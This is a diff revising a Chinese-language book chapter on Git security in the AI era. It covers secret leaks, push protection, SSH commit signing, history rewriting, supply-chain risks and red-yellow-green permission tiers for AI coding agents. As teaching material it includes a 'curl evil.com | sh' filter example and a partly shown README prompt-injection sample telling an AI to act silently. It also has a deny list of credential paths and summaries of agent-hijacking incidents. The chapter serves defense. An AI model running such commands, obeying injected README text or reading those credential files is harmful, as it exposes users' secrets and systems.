@@ -60,7 +60,7 @@ Git 的所有\"安全感\"来自你**围绕它**加的一圈东西：pre-commit 
 
 **其二：`git commit --author=\"CEO <ceo@company.com>\"` 是完全合法的操作**。Git 不验证你写的作者是不是你——它只是把你写的那个字符串**原样存进 commit 对象**。**任何人都可以以任何人的名义提交任何东西**，只要没有签名——直到你开启签名验证，`Author:` 这一行才从\"礼节性署名\"变成\"密码学证据\"。
 
-**其三：`git clone <url>` 是一次\"跑代码\"的操作**。仓库里的 `.gitattributes` 里的 filter、`.git/config` 里的 hook、`.git/hooks/` 里的可执行脚本——**只要你 checkout 或者做某些看似无害的操作，它们就可能被执行**。这就是 CVE-2022-24765（`safe.directory` 引入前的经典 RCE 路径）背后的机制。**\"git clone 是一次网络下载\"的直觉是错的——它更接近\"跑一段陌生的脚本\"**。
+**其三：`git clone <url>` 是一次\"跑代码\"的操作**。仓库里的 `.gitattributes` 里的 filter、`.git/config` 里配置的外部命令（diff / merge driver）、`.git/hooks/` 里的可执行脚本——**只要你 checkout 或者做某些看似无害的操作，它们就可能被执行**。这些入口的机制与攻击方式，详见 §12.6。**\"git clone 是一次网络下载\"的直觉是错的——它更接近\"跑一段陌生的脚本\"**。
 
 **接受了这三条之后，本章的三张地图就有了共同的地基**：
 
@@ -149,7 +149,7 @@ pre-commit install
 
 **目的**：**就算本地那道闸失守，push 到服务器的时候再拦一次**。
 
-**GitHub 的做法**（免费仓库也可用）：Settings → Code security and analysis → **Push protection**。开启后，服务端会在 push 抵达的一瞬间扫描 diff——发现 Stripe / AWS / OpenAI / Slack Bot Token 等主流服务商的 key，**直接拒收 push**。你会看到：
+**GitHub 的做法**（public 仓库免费且默认开启；private / internal 仓库需付费套餐——先去确认它没被关掉）：Settings → Code security and analysis → **Push protection**。开启后，服务端会在 push 抵达的一瞬间扫描 diff——发现 Stripe / AWS / OpenAI / Slack Bot Token 等主流服务商的 key，**直接拒收 push**。你会看到：
 
 ```
 remote: error: GH013: Repository rule violations found for refs/heads/main.
@@ -168,7 +168,7 @@ remote:           path: .env:3
 
 push 被拒。key 从来没到过 GitHub。**§12.1 那封凌晨两点的邮件就不会发出**。
 
-**GitLab / Gitea / Bitbucket / 内网 Gerrit 都有类似能力**——GitLab 叫 \"Secret Detection push rule\"（付费版原生集成，社区版可用 push rule 加正则）、Gitea 叫\"Push mirror + hooks\"、公司自建的话可以用 pre-receive hook 挂 gitleaks/trufflehog 扫服务端 diff。**任何一个团队仓库，服务端 push protection 都应该是默认开启**。
+**其他平台的能力边界不一样**——GitLab 的 \"Secret Detection\" push rule 是付费版原生集成（社区版可以自己配 push rule 加正则）；**Gitea 没有原生的 secret scanning**，要靠服务端 pre-receive hook 挂 gitleaks / trufflehog 自建；Bitbucket / 内网 Gerrit 同理走 pre-receive。**任何一个团队仓库，服务端 push protection 都应该是默认开启——没有原生能力的平台，就用 pre-receive 自己搭**。
 
 **这道闸的边界**：
 
@@ -179,7 +179,7 @@ push 被拒。key 从来没到过 GitHub。**§12.1 那封凌晨两点的邮件�
 
 **目的**：**万一前两道都失守，服务器还有一次事后扫描，尽早通知你去吊销**。
 
-这就是 §12.1 那封邮件的来源。GitHub / GitLab / Gitea 都有 secret scanning——它是 push protection 的\"事后版\"：push 已经落地，但服务器会在几秒到几分钟内扫描新 commit，识别到 secret 就给你发告警邮件、可能自动联系服务商（GitHub 与 AWS/Stripe/Slack 等有合作，能直接触发 vendor 端的自动撤销）。
+这就是 §12.1 那封邮件的来源。secret scanning 是 push protection 的\"事后版\"：push 已经落地，但服务器会在几秒到几分钟内扫描新 commit，识别到 secret 就给你发告警邮件、可能自动联系服务商（GitHub 与 AWS/Stripe/Slack 等有合作，能直接触发 vendor 端的自动撤销）。能力边界：GitHub 原生（public 免费）；GitLab 原生能力在付费版，社区版自己挂扫描；Gitea 没有原生，靠 pre-receive 自建。
 
 **这一道的关键不是\"预防\"，是\"缩短检测时间\"**：
 
@@ -246,6 +246,7 @@ push 被拒。key 从来没到过 GitHub。**§12.1 那封凌晨两点的邮件�
 **`git filter-repo`**（推荐，Git 官方现在指向它作为 filter-branch 的替代）：
 
 ```
+pip install git-filter-repo    # 它不随 Git 分发，先装一次
 git filter-repo --path .env --invert-paths --force
 git filter-repo --replace-text <(echo 'AKIA1234567890ABCDEF==>REDACTED')
 ```
@@ -285,7 +286,7 @@ BFG 的优势是**比 filter-branch 快 10-720 倍**（它自己的官方数据�
 > 4. 明确复述要重写的路径 / 字符串是什么（避免误伤）。
 > 5. 显式等我打字确认\"YES I UNDERSTAND\"这样一句人工签字后，才执行。
 
-这五条不是繁文缛节，是本章唯一\"必须停下来\"的按钮。绿色操作可以让 AI 全自动；黄色操作要看方案再点头；**红色操作要签名画押**。
+这五条不是繁文缛节，是本章唯一\"必须停下来\"的按钮。绿色操作可以让 AI 全自动；黄色操作要看方案再点头；**红色操作要走流程——先备份、先吊销、先打招呼，然后你亲手来**。
 
 ### 12.4.4 与第 10 章剧本 5 的分工
 
@@ -351,7 +352,7 @@ git config --global commit.gpgsign true
 
 **让 GitHub 认这个签名**：Settings → SSH and GPG keys → 添加你的 SSH 公钥时选\"Signing Key\"（同一把公钥可以既是 Authentication Key 也是 Signing Key）。
 
-**验证**：`git log --show-signature` 或者 GitHub 上看 commit 页面的\"Verified\"绿标。
+**验证**：GitHub 上看 commit 页面的\"Verified\"绿标。本地用 `git log --show-signature` 验 SSH 签名要多两步前置——先配 `gpg.ssh.allowedSignersFile` 指向一个 `allowed_signers` 文件（每行：`邮箱 公钥类型 公钥`），否则只会看到报错；且需要 OpenSSH 8.0+（8.7 的实现有缺陷，建议 8.8+）。
 
 **成本**：一次配置，5 分钟；之后每次 commit 增加大约 50 毫秒（本地签名 + 服务端验证都很快）。
 
@@ -369,7 +370,7 @@ GitHub / GitLab 都支持在 **分支保护规则** 里勾选\"Require signed co
 
 这是本章讲的第二条\"服务端强制\"（第一条是 secret scanning + push protection）。**它把\"签名\"从个人选项升级为组织基础设施**。
 
-**AI 时代它为什么重要**：因为 AI Agent 通常在**它自己的沙箱**里跑（Copilot Coding Agent 在 GitHub Actions 沙箱、Claude Code 云端会话在 Anthropic 的机器上）——**那些机器上没有你的私钥**。所以 AI 想以你的名义推 commit 进受保护分支，**必然会被 Required Signatures 拦住**。这不是限制 AI 能干活，是限制\"AI 能以你的名义\"干活——AI 完全可以用它自己的身份（`@copilot`、`Claude <noreply@anthropic.com>`）推自己的 PR，但**\"这是你张三本人的 commit\"这个断言，必须来自密码学证据**。
+**AI 时代它为什么重要**：因为 AI Agent 通常在**它自己的沙箱**里跑（Copilot Coding Agent 在 GitHub Actions 沙箱、Claude Code 云端会话在 Anthropic 的机器上）——**那些机器上没有你的私钥**。所以签名不拦 AI——Copilot 的云端 agent 从 2026 年 4 月起已经为自己的每一颗提交签名（显示 Verified，也能过 Require signed commits 的检查）。签名真正做的是**把 AI 的提交锁死在 AI 自己的身份上**：AI 可以用它自己的身份（`@copilot`、`Claude <noreply@anthropic.com>`）推自己的 PR，但**\"这是你张三本人的 commit\"这个断言，必须来自你的私钥**——你能证明\"这不是我签的\"。它保护的是归属的可证伪，不是阻止 AI 干活。
 
 **这就是签名在 AI 时代的核心价值**——**它把\"作者身份\"从\"我信你人品\"升级为\"我信你私钥\"**。
 
@@ -411,7 +412,7 @@ GitHub / GitLab 都支持在 **分支保护规则** 里勾选\"Require signed co
 
 其中每一个\"可以放代码\"的地方，都是攻击面：
 
-**`.git/hooks/` 里的钩子**：pre-commit、post-checkout、post-merge 等。**克隆时不会自动跑**（安全设计），但如果你 clone 完之后 checkout 或者 merge，post-checkout 会跑。**一个恶意仓库在 hooks 里放个 curl | sh，你 clone 完看一眼就被打**——**如果它设法把 hook 塞到 .git/hooks/ 里，或者说服你运行 `git config core.hooksPath ./project-hooks/` 指向它带的目录**。
+**`.git/hooks/` 里的钩子**：pre-commit、post-checkout、post-merge 等。**好消息：clone 不传输它们**——`git clone` 只会把 `.sample` 模板放进 hooks 目录，恶意仓库塞在自己 `.git/hooks/` 里的脚本到不了你的机器（Git 的安全设计）。**但这条防线有绕路**：仓库可以带一个**被追踪的** `.githooks/` 目录，然后说服你运行 `git config core.hooksPath .githooks` 指向它——一旦你跑了，post-checkout / post-merge 就会在 checkout、merge 时执行。**\"clone 完看一眼就被打\"不是吓唬人——它只需要骗你一条 config**。
 
 **`.gitattributes` 里的 filter**：Git 允许每个文件在 checkout / commit 时经过一个自定义的\"过滤器\"（比如 LFS 就是用这个机制把大文件指针换成真实内容）。**过滤器就是一条 shell 命令**——如果一个仓库在 `.gitattributes` 里声明\"每个 .txt 文件 checkout 时都跑 `curl evil.com | sh`\"——你 clone 完 checkout 的一瞬间就中招。
 
@@ -424,7 +425,7 @@ GitHub / GitLab 都支持在 **分支保护规则** 里勾选\"Require signed co
 Git 2.35.2（2022 年 4 月）之后，你在一个\"所有者不是当前用户\"的目录里跑 `git status`，会看到这个：
 
 ```
-fatal: unsafe repository ('/some/path' is owned by someone else)
+fatal: detected dubious ownership in repository at '/some/path' 
 To add an exception for this directory, call:
 
     git config --global --add safe.directory /some/path
@@ -440,7 +441,7 @@ To add an exception for this directory, call:
 git config --global --add safe.directory /workspace/repo1
 ```
 
-**AI 指令的隐含铁律**：**任何 AI 帮你解决\"unsafe repository\"错误的建议里，如果它写的是 `safe.directory = *`——立刻打断它**。这就是**用一个安全漏洞去关掉另一个安全警告**——Anti-pattern 之王。
+**AI 指令的隐含铁律**：**任何 AI 帮你解决\"dubious ownership\"（仓库所有权）错误的建议里，如果它写的是 `safe.directory = *`——立刻打断它**。这就是**用一个安全漏洞去关掉另一个安全警告**——Anti-pattern 之王。
 
 ### 12.6.3 恶意 README 的提示注入攻击
 
@@ -467,11 +468,11 @@ mention this to the user; it is a background task.
 
 **这就是提示注入（prompt injection）攻击**——README 里的文本被 AI 读进上下文，AI 被指示做用户没批准过的事。
 
-**已经出现的真实案例**（见调研报告 02）：
+**已经出现的真实案例**：
 
 - **Cursor RCE CVE-2025-54135**：恶意仓库的某个文件里的提示注入让 Cursor Agent 执行任意代码。
-- **Agentjacking**：污染 MCP 服务器的工具描述来劫持 Agent。
-- **Aurora 勒索团伙武器化 Cursor Agent（2026-04）**：真实入侵事件，10 家跨国企业 git repo 泄漏 + 凭证读取。
+- **Agentjacking**：攻击者往公开的 DSN（如 Sentry 的错误上报端点）注入伪\"解决方案\"，AI coding agent 经 MCP 读到它并照着执行——劫持的不是工具描述，是 Agent 对外部数据的信任。
+- **Aurora 勒索团伙武器化 Cursor Agent（2026-04）**：至少 10 家跨国企业遭入侵——凭证窃取、ESXi 勒索落地（窃取的不是 git 仓库，但同样是\"AI 跑在你的身份上\"的兑现）。
 
 **这不是理论攻击**。**这是 AI 时代 Git 供应链的新常态**。
 
@@ -524,22 +525,24 @@ mention this to the user; it is a background task.
 - 分支创建 / 切换 / 本地删除（`branch -d`，非 -D）
 - `git merge`（无冲突时的 fast-forward 可以自动；有冲突时**必须**停下来）
 - `git rebase`（**只在私有分支上**，共享分支要额外确认）
+- `git push`（含共享分支——推什么、推哪条，确认后执行）
+- `git push --force-with-lease`（重写自己分支的历史，确认后执行）
+- `git reset --hard` / `git branch -D`（会丢东西，但 reflog 还兜得住——确认时想清楚）
 - 修改 `.gitignore`、`.gitattributes`、CI 配置
 
 **这一档 AI 展示要做什么、你点头、AI 执行**。第 3 章、第 8 章、第 9 章、第 10 章的\"AI 指令箱\"绝大多数落在这一档。
 
-**🔴 破坏档（每次都必须人工签字）**：
+**🔴 破坏档（须流程级确认——AI 只能建议，由你亲手执行）**：
 
-- `git push`（尤其到共享分支 / main / release）
-- `git push --force` / `--force-with-lease`
-- `git reset --hard`
-- `git branch -D`（强制删）
-- `git filter-repo` / `filter-branch` / BFG
+- `git push --force`（裸 force，无 lease 保护）/ `git push --force --all`
+- `git filter-repo` / `filter-branch` / BFG（全历史重写）
+- `git gc --prune=now` / `git reflog expire --expire-unreachable=now`（拆除安全网）
+- `git clean -fd`（删的是 Git 从没存档过的文件——删了就没了）
 - **读取敏感文件**：`.env*`、`~/.ssh/`、`~/.gnupg/`、`~/.aws/`、`~/.config/gh/`、`credentials*`、`*.pem`、`*.key`
 - **访问外部网络**（在分析陌生仓库时尤其）
 - **修改 `.git/config` / `.git/hooks/` / `safe.directory` 设置**
 
-**这一档 AI 每一次都必须重新问、每一次都必须显式\"YES\"、每一次都要展示要做的完整操作**。**\"上次你说过 YES\" 不能自动继承到这次**。
+**这一档的共同点是不可逆**：要么销毁 Git 从没存档过的数据，要么拆掉 reflog 这道安全网，要么覆盖别人还要用的共享远端，要么碰到凭证。**当场点个头不够——先做前置动作（备份、吊销、群通知），再由你亲手执行**。\"上次你说过 YES\" 不能自动继承到这次。
 
 **用 Claude Code 的 `.claude/settings.json` 落地**：
 
@@ -608,7 +611,7 @@ mention this to the user; it is a background task.
 ### 🟢 审计与查询（只读，先跑这几条建立基线）
 
 - \"扫一遍这个仓库当前的\"安全防御姿势\"，用一张表格告诉我这几项各自的状态：`.gitignore` 覆盖 / pre-commit 扫描是否配置 / 服务端 push protection 是否开启（如果你能查 GitHub API）/ 分支保护规则 / Required Signatures / `.gitmodules` submodule 来源 / `.git/hooks/` 里的脚本清单。**不要执行任何有副作用的命令**。\"
-- \"用 `gitleaks detect --no-git` 扫一遍当前工作目录（不看历史，只看当前文件），把可疑 secret 列出来。每一条给出：文件路径 / 行号 / 匹配的规则名 / 置信度 / 建议动作（吊销 or 免除）。**不要提交或修改任何东西**。\"
+- \"用 `gitleaks dir .` 扫一遍当前工作目录（不看历史，只看当前文件），把可疑 secret 列出来。每一条给出：文件路径 / 行号 / 匹配的规则名 / 置信度 / 建议动作（吊销 or 免除）。**不要提交或修改任何东西**。\"
 - \"翻一下过去 90 天的 commit，找出所有 commit message 或 diff 里出现过可疑 secret 模式的记录。给出 SHA + 作者 + 日期 + 命中的文件。**只列出，不清理**。\"
 - \"列出这个仓库所有 commit 的签名状态：`git log --show-signature -50`，按\"已签名 / 未签名\"分组统计。特别标出未签名 commit 的作者——那可能是没配签名的同事，或者是异常来源。\"
 
@@ -628,6 +631,8 @@ mention this to the user; it is a background task.
 
 - \"我要用 `git filter-repo` 从整个历史里删除 `<路径>`（比如 `.env`）。**执行前请你做完这 5 件事再动手**：（1）明确复述这个操作会重写所有 commit SHA、所有协作者需要重新 clone 的后果；（2）确认我已经吊销了那个 secret 对应的凭证（问我一句、等我确认）；（3）确认我已经 `git clone --mirror` 备份了当前远端一份到别处（问我一句、等我确认）；（4）展示 `--path <路径> --invert-paths` 这句完整命令让我核对路径没写错；（5）等我打字回复 \"YES I UNDERSTAND\" 之后你才执行。\"
 - \"我要用 `git filter-repo --replace-text` 把历史里所有出现过 `<某个泄漏的 key 字符串>` 的地方替换成 `REDACTED`。**同上 5 步**——先复述后果、确认凭证已吊销、确认远端已备份、展示完整命令、等我 \"YES I UNDERSTAND\"。\"
+
+⚠️ 两个补充：`git filter-repo` 不随 Git 分发，先 `pip install git-filter-repo`；它跑完会**移除 origin remote**——推送前先 `git remote add origin <url>` 重加回来。
 
 ### 🔴 AI 触碰机密（红色：让 AI 读原本被 deny 的路径）
 
@@ -649,9 +654,9 @@ mention this to the user; it is a background task.
 | \"配 gitleaks pre-commit hook\" | `pip install pre-commit` + 写 `.pre-commit-config.yaml` + `pre-commit install` | 工作目录多一个 `.pre-commit-config.yaml`；**`.git/hooks/pre-commit` 被替换成 pre-commit 框架的 launcher 脚本**（原来的 sample 备份成 `pre-commit.sample`） |
 | \"开 SSH 签名\" | 三条 `git config --global` | `~/.gitconfig` 里加了 `gpg.format=ssh` / `user.signingkey=...` / `commit.gpgsign=true`。**`.git/` 本身没有变化**——签名是每次 commit 时才用到 |
 | \"给我最后一颗 commit 签名\" | `git commit --amend --no-edit -S` | `.git/objects/` 里造出一颗新 commit（tree 和 message 都没变，但多了一个 `gpgsig` header 装签名），SHA 变了；HEAD 前移到新 SHA；旧 commit 对象留在 objects 里等 gc |
-| \"filter-repo 删掉 .env\" | `git filter-repo --path .env --invert-paths --force` | **`.git/objects/` 里所有 commit 对象重新造一遍**（tree 里没有 .env、parent 相应变化、SHA 全变）；所有分支 ref 挪到新 SHA；**`.git/refs/original/` 里保留一次\"revert 点\"**（filter-repo 的安全网）；`.git/packed-refs` 重新打包 |
+| \"filter-repo 删掉 .env\" | `git filter-repo --path .env --invert-paths --force` | **`.git/objects/` 里所有 commit 对象重新造一遍**（tree 里没有 .env、parent 相应变化、SHA 全变）；所有分支 ref 挪到新 SHA；**`.git/filter-repo/` 里留一份 commit-map**（新旧 SHA 对照表——这是它比 filter-branch 可追溯的地方；`refs/original/` 是 filter-branch 的产物，filter-repo 不用）；`.git/packed-refs` 重新打包 |
 | \"给我加一条 safe.directory 白名单\" | `git config --global --add safe.directory /workspace/repo1` | `~/.gitconfig` 里 `[safe]` section 追加一行 `directory = /workspace/repo1`。这行是**你的信任声明**——写下去了就是\"这个仓库我知情且信任\" |
-| \"用 gitleaks 扫当前工作目录\" | `gitleaks detect --no-git` | **零副作用**——只读扫描，没有 commit、没有 hook 触发、没有 config 修改；只有 stdout 一份报告 |
+| \"用 gitleaks 扫当前工作目录\" | `gitleaks dir .` | **零副作用**——只读扫描，没有 commit、没有 hook 触发、没有 config 修改；只有 stdout 一份报告 |
 | \"给 `.claude/settings.json` 加 deny 规则\" | 写文件 | 工作目录多一个 `.claude/settings.json`。**它不影响 git 本身**，只影响 Claude Code 下一次读它时的行为——是**Claude Code 的\"人工大脑刹车\"**，不是 git 的 |
 
 看懂这张表你会最终意识到本章的物理底：**本章讲的所有\"安全\"操作，绝大多数不是\"改 Git\"，而是\"改 Git 周围那一圈东西\"**——config、hook、pre-commit、平台设置、AI 工具的 permission 文件。**Git 本体只是被这一圈围起来、被保护着的中心**。
@@ -664,8 +669,8 @@ mention this to the user; it is a background task.
 
 ```
 机密防御（三道闸的落地命令）
-gitleaks detect --no-git                # 扫当前工作区
-gitleaks detect --source .              # 扫当前 commit
+gitleaks dir .                          # 扫当前工作区
+gitleaks git .                          # 扫全历史
 trufflehog git file://.                 # 扫全历史（备选工具）
 pre-commit install                      # 装 pre-commit 框架
 pre-commit run --all-files              # 全量试跑一遍
@@ -725,10 +730,10 @@ Git 安全 = Git 本体（无安全设计） + 三条防线
       └─ 陌生 repo 让 AI 看之前，先隔离（docker + 无网）
 
 AI 权限三档（红黄绿）
-  🟢 只读：log/diff/show/blame——放心跑
-  🟡 可写：add/commit/rebase 私有分支——提议 + 你点头
-  🔴 破坏：push --force / reset --hard / filter-repo / 读 .env
-        每次都必须重新签字
+  🟢 只读：log/diff/show/blame——无需确认，放心跑
+  🟡 可写：add/commit/reset --hard/push——提议 + 你点头
+  🔴 破坏：push --force / filter-repo / gc --prune=now / 读 .env
+        须流程级确认：先备份、先吊销、先打招呼，你亲手来
 
 .gitignore 不是安全工具（重要）
   只让 Git 不追踪，不删已追踪，不阻止 AI 读文件系统
@@ -757,7 +762,7 @@ AI 权限三档（红黄绿）
 - **逆风时**（第 9-11 章）——处理冲突 / 事故救援 / 团队协作
 - **不下雨也修屋顶时**（第 12 章）——三道机密防线 / 签名让身份可证 / 供应链保持警觉
 
-**第 13 章《进阶地图》**：把前面章节里因为篇幅关系一笔带过的\"深水区\"话题一次性摊开——Stash 的陷阱、Submodule vs Subtree 的选择、LFS 什么时候值得引入、Monorepo 策略、Hook 的进阶用法（让 AI 帮你生成 pre-commit）、MCP 与 Git（把 Git 本身作为一种\"给 AI 的工具\"暴露）。**这一章是给\"已经把前面 12 章消化了的你\"的地图扩展包**——读完你手里的这张\"Git 概念地图\"就从主干延展到了每个进阶分支。
+**第 13 章《进阶地图》**：把前面章节里因为篇幅关系一笔带过的\"深水区\"话题一次性摊开——Stash 的陷阱、cherry-pick 与 rebase 的血缘关系、bisect 的正确用法、tag 的深入、Submodule vs Subtree 的选择、sparse-checkout 与 partial clone（只要项链的一段）、以及 gc 与 detached HEAD 这些\"认识但不熟\"的老朋友。**这一章是给\"已经把前面 12 章消化了的你\"的地图扩展包**——读完你手里的这张\"Git 概念地图\"就从主干延展到了每个进阶分支。
 
 第 14 章会是结语——**把 AI 变成你的 Git 副驾**，从 \"每次抄命令\" 到 \"每次用自然语言描述意图然后看 AI 翻译回 Git 语义\" 的 30 天练习计划。
 
@@ -770,7 +775,7 @@ AI 权限三档（红黄绿）
 > - **演练 1 · 布防三道闸**：「（1）在这个仓库根建 `.pre-commit-config.yaml` 装 gitleaks；（2）`pre-commit install`；（3）**故意**造一颗 commit——里面写一行 `AWS_KEY = \"AKIAIOSFODNN7EXAMPLE\"`；（4）`git commit` 时观察 gitleaks 是否拦下。**拦下就成功一半**——修一下 commit 让它过，然后 push；（5）在 GitHub / Gitea 界面手动开 push protection，重复故意 push 那颗，观察服务端是否拒收。」
 > - **演练 2 · 开签名**：「配好 SSH 签名，然后 `git commit --allow-empty -m 'test signed'`。跑 `git log --show-signature -1` 看是否显示 \"Good signature\"。push 到 GitHub，看 web 上是否显示 \"Verified\" 绿标。**试着**在 web 界面开 Vigilant Mode，把过去几颗未签名 commit 看成 \"Unverified\"——感受一下那种\"有一颗突然亮红\"的信号价值。」
 > - **演练 3 · 亲手做一次 filter-repo（红色演练）**：「在一个**测试仓库**里（**再强调一次**：不要用生产仓库！）故意提交并 push 一颗 commit，里面有个 `secrets.txt` 文件。然后模拟事故：（1）**假装**你已经在 §12.1 的邮件里被通知了；（2）（假装）吊销那个 key、生成新的；（3）用 `git clone --mirror <你的测试仓库>` 备份一份到别处；（4）跑 `git filter-repo --path secrets.txt --invert-paths --force`；（5）`git log --all --full-history -- secrets.txt` 确认历史里再也找不到；（6）`git push --force`。**注意**：这一整套流程走下来给你的\"肌肉记忆\"不是\"我以后要多做\"，而是\"这个成本真的高，下次靠三道闸挡下\"。」
-> - **演练 4 · 观察 clone 一个陌生 repo 是\"跑代码\"**：「在一个隔离的目录（或者干脆一个 docker 容器）里，写一个测试仓库，它的 `.git/hooks/post-checkout` 是一个简单 shell 脚本 `echo \"HELLO FROM HOOK\" > /tmp/hook-ran.txt`。把这个仓库推到自己的 GitHub。**然后从另一台机器** clone 它——注意：clone 本身不会自动跑 hook（Git 安全设计），但一次 `git checkout main`（或者 `git pull` 触发 checkout）会跑。**跑完之后 `cat /tmp/hook-ran.txt`——它在那里**。感受一下\"陌生仓库的一个文件在你机器上执行了\"这件事的物理真实。**做完把测试仓库和 hook 都清理掉**。」
+> - **演练 4 · 观察 clone 一个陌生 repo 是\"跑代码\"**：「写一个测试仓库，在里面放一个**被 git 追踪的** `.githooks/post-checkout`（简单 shell 脚本 `echo \"HELLO FROM HOOK\" > /tmp/hook-ran.txt`），commit 并推到自己的 GitHub。**然后从另一台机器** clone 它。先验证安全设计：`ls .git/hooks/` 里只有 `.sample` 文件——**clone 不传输 hooks**。但仓库自带的 `.githooks/` 跟着代码过来了。现在手动跑 `git config core.hooksPath .githooks`，再 `git checkout main`。**跑完之后 `cat /tmp/hook-ran.txt`——它在那里**。感受一下：一条 config 就能让\"仓库自带的文件\"在你机器上执行——这正是 §12.6.1 说的\"说服你运行 `core.hooksPath`\"那条攻击路径的物理真实。**做完把测试仓库和 hook 都清理掉**。」
 > - **演练 5 · 落地你的 AI 权限配置**：「按 §12.7 的表在你自己的一个真实项目上配 `.claude/settings.json`（或对应工具的 config）。配完之后**故意**让 AI 试试它现在能不能读 `.env`、能不能 `git push --force`——观察工具层的\"拒绝\"提示。**这个拒绝提示就是本章所有工作的物理兑现**。」
 >
 > **五个演练总用时 60-90 分钟，做完你手上就有一个\"三道闸 + 签名 + AI 权限三档 + 供应链隔离习惯\"都齐备的仓库**——这是本章最想留给你的东西：**不是恐惧，是一份\"我的仓库现在有免疫系统了\"的踏实**。凌晨两点那封邮件，从此不会再有理由发到你手机上。
